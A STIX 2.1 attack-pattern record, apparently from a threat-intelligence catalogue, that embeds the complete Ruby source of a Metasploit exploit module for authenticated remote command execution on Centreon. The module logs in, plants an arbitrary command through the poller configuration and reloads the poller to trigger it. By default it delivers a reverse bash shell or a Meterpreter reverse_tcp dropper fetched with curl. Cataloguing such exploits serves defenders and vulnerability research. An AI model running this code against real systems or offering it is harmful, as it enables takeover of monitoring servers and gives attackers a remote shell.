{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--902f9d94-83b2-4450-b5d4-8903f51650a4",
    "created": "2024-08-14T17:00:40.542938Z",
    "modified": "2024-08-14T17:00:40.542942Z",
    "name": "Centreon Poller Authenticated Remote Command Execution",
    "description": " An authenticated user with sufficient administrative rights to manage pollers can use this functionality to execute arbitrary commands remotely. Usually, the miscellaneous commands are used by the additional modules (to perform certain actions), by the scheduler for data processing, etc.  This module uses this functionality to obtain a remote shell on the target. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/centreon_pollers_auth_rce.rb",
            "external_id": "centreon_pollers_auth_rce.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Centreon Poller Authenticated Remote Command Execution',\n        'Description' => %q{\n          An authenticated user with sufficient administrative rights to manage pollers can use this functionality to\n          execute arbitrary commands remotely. Usually, the miscellaneous commands are used by the additional modules\n          (to perform certain actions), by the scheduler for data processing, etc.\n\n          This module uses this functionality to obtain a remote shell on the target.\n        },\n        'Author' => [\n          'Omri Baso', # discovery\n          'Fabien Aunay', # discovery\n          'mekhalleh (RAMELLA S\u00e9bastien)' # this module\n        ],\n        'References' => [\n          ['EDB', '47977']\n        ],\n        'DisclosureDate' => '2020-01-27',\n        'License' => MSF_LICENSE,\n        'Platform' => ['linux', 'unix'],\n        'Arch' => [ARCH_CMD, ARCH_X64],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Reverse shell (In-Memory)',\n            {\n              'Platform' => 'unix',\n              'Type' => :cmd_unix,\n              'Arch' => ARCH_CMD,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ],\n          [\n            'Meterpreter (Dropper)',\n            {\n              'Platform' => 'linux',\n              'Type' => :meterpreter,\n              'Arch' => ARCH_X64,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',\n                'CMDSTAGER::FLAVOR' => :curl\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('PASSWORD', [true, 'The Centreon Web panel password to authenticate with']),\n      OptString.new('TARGETURI', [true, 'The URI of the Centreon Web panel path', '/centreon']),\n      OptString.new('USERNAME', [true, 'The Centreon Web panel username to authenticate with'])\n    ])\n  end\n\n  def create_new_poller(poller_name, command_id)\n    params = { 'p' => '60901' }\n\n    print_status('Create new poller entry on the target.')\n    token = get_token(normalize_uri(target_uri.path, 'main.get.php'), params)\n    return false unless token\n\n    response = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'main.get.php'),\n      'cookie' => @cookies,\n      'partial' => true,\n      'vars_get' => params,\n      'vars_post' => {\n        'name' => poller_name,\n        'ns_ip_address' => '127.0.0.1',\n        'localhost[localhost]' => '1',\n        'is_default[is_default]' => '0',\n        'remote_id' => '',\n        'ssh_port' => '22',\n        'remote_server_centcore_ssh_proxy[remote_server_centcore_ssh_proxy]' => '1',\n        'engine_start_command' => 'service centengine start',\n        'engine_stop_command' => 'service centengine stop',\n        'engine_restart_command' => 'service centengine restart',\n        'engine_reload_command' => 'service centengine reload',\n        'nagios_bin' => '/usr/sbin/centengine',\n        'nagiostats_bin' => '/usr/sbin/centenginestats',\n        'nagios_perfdata' => '/var/log/centreon-engine/service-perfdata',\n        'broker_reload_command' => 'service cbd reload',\n        'centreonbroker_cfg_path' => '/etc/centreon-broker',\n        'centreonbroker_module_path' => '/usr/share/centreon/lib/centreon-broker',\n        'centreonbroker_logs_path' => '/var/log/centreon-broker',\n        'centreonconnector_path' => '',\n        'init_script_centreontrapd' => 'centreontrapd',\n        'snmp_trapd_path_conf' => '/etc/snmp/centreon_traps/',\n        'pollercmd[0]' => command_id,\n        'clone_order_pollercmd_0' => '',\n        'ns_activate[ns_activate]' => '1',\n        'submitA' => 'Save',\n        'id' => '',\n        'o' => 'a',\n        'centreon_token' => token\n      }\n    )\n    return false unless response\n\n    return true\n  end\n\n  def execute_command(command, _opts = {})\n    cmd_name = rand_text_alpha(8..42)\n    params = { 'p' => '60803', 'type' => '3' }\n    poller_name = rand_text_alpha(8..42)\n\n    ## Register a miscellaneous command.\n    print_status('Upload command payload on the target.')\n\n    token = get_token(normalize_uri(target_uri.path, 'main.get.php'), params)\n    unless token\n      print_bad('Could not get the upload form token, potentially due to insufficient access rights.')\n      return false\n    end\n\n    response = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'main.get.php'),\n      'cookie' => @cookies,\n      'partial' => true,\n      'vars_get' => params,\n      'vars_post' => {\n        'command_name' => cmd_name,\n        'command_type[command_type]' => '3',\n        'command_line' => command,\n        'resource' => '$CENTREONPLUGINS$',\n        'plugins' => '/Centreon/SNMP',\n        'macros' => '$ADMINEMAIL$',\n        'command_example' => '',\n        'listOfArg' => '',\n        'listOfMacros' => '',\n        'connectors' => '',\n        'graph_id' => '',\n        'command_activate[command_activate]' => '1',\n        'command_comment' => '',\n        'submitA' => 'Save',\n        'command_id' => '',\n        'type' => '3',\n        'o' => 'a',\n        'centreon_token' => token\n      }\n    )\n    return false unless response\n\n    ## Create new poller to serve the payload.\n    create_new_poller(poller_name, get_command_id(cmd_name))\n\n    ## Export configuration to reload to trigger the exploit.\n    poller_id = get_poller_id(poller_name)\n    if poller_id.nil?\n      print_bad('Could not trigger the vulnerability!')\n    end\n    restart_exportation(poller_id)\n  end\n\n  def get_auth\n    print_status('Sending authentication request.')\n    token = get_token(normalize_uri(target_uri.path, 'index.php'))\n    unless token.nil?\n      response = send_request_cgi(\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\n        'cookie' => @cookies,\n        'vars_post' => {\n          'useralias' => datastore['USERNAME'],\n          'password' => datastore['PASSWORD'],\n          'submitLogin' => 'Connect',\n          'centreon_token' => token\n        }\n      )\n      return false unless response\n\n      if response.redirect? && response.headers['location'].include?('main.php')\n        print_good('Successfully authenticated.')\n        @cookies = response.get_cookies\n        return true\n      end\n    end\n\n    print_bad('Your credentials are incorrect.')\n    return false\n  end\n\n  def get_command_id(cmd_name)\n    response = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'main.get.php'),\n      'cookie' => @cookies,\n      'vars_get' => {\n        'p' => '60803',\n        'type' => '3'\n      }\n    )\n    return nil unless response\n\n    href = response.get_html_document.at(\"//a[contains(text(), \\\"#{cmd_name}\\\")]\")['href']\n    return nil unless href\n\n    id = href.split('?')[1].split('&')[2].split('=')[1]\n    return id unless id.empty?\n\n    return nil\n  end\n\n  def get_poller_id(poller_name)\n    response = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'main.get.php'),\n      'cookie' => @cookies,\n      'vars_get' => { 'p' => '60901' }\n    )\n    return nil unless response\n\n    href = response.get_html_document.at(\"//a[contains(text(), \\\"#{poller_name}\\\")]\")['href']\n    return nil unless href\n\n    id = href.split('?')[1].split('&')[2].split('=')[1]\n    return id unless id.empty?\n\n    return nil\n  end\n\n  def get_session\n    response = send_request_cgi(\n      'method' => 'HEAD',\n      'uri' => normalize_uri(target_uri.path, 'index.php')\n    )\n    cookies = response.get_cookies\n    return cookies unless cookies.empty?\n  end\n\n  def get_token(uri, params = {})\n    ## Get centreon_token value.\n    request = {\n      'method' => 'GET',\n      'uri' => uri,\n      'cookie' => @cookies\n    }\n    request = request.merge({ 'vars_get' => params }) unless params.empty?\n    response = send_request_cgi(request)\n\n    return nil unless response\n\n    begin\n      token = response.get_html_document.at('input[@name=\"centreon_token\"]')['value']\n    rescue NoMethodError\n      return nil\n    end\n\n    return token\n  end\n\n  def restart_exportation(poller_id)\n    print_status('Reload the poller to trigger exploitation.')\n    token = get_token(normalize_uri(target_uri.path, 'main.get.php'), { 'p' => '60902', 'poller' => poller_id })\n\n    unless token\n      print_bad('Could not get the poller form token, potentially due to insufficient access rights.')\n      return false\n    end\n\n    vprint_status(' -- Generating files.')\n    response = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'include', 'configuration', 'configGenerate', 'xml', 'generateFiles.php'),\n      'cookie' => @cookies,\n      'vars_post' => {\n        'poller' => poller_id,\n        'debug' => 'true',\n        'generate' => 'true'\n      }\n    )\n    return false unless response\n\n    vprint_status(' -- Restarting engine.')\n    response = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'include', 'configuration', 'configGenerate', 'xml', 'restartPollers.php'),\n      'cookie' => @cookies,\n      'vars_post' => {\n        'poller' => poller_id,\n        'mode' => '2'\n      }\n    )\n    return false unless response\n\n    vprint_status(' -- Executing command.')\n    response = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'include', 'configuration', 'configGenerate', 'xml', 'postcommand.php'),\n      'cookie' => @cookies,\n      'vars_post' => { 'poller' => poller_id }\n    )\n    return false unless response\n\n    return true\n  end\n\n  def exploit\n    @cookies = get_session\n    logged = get_auth unless @cookies.empty?\n    if logged\n      case target['Type']\n      when :cmd_unix\n        execute_command(payload.encoded)\n      when :meterpreter\n        execute_command(generate_cmdstager.join(';'))\n      end\n    end\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-01-27",
    "x_mitre_platforms": [
        "linux'"
    ]
}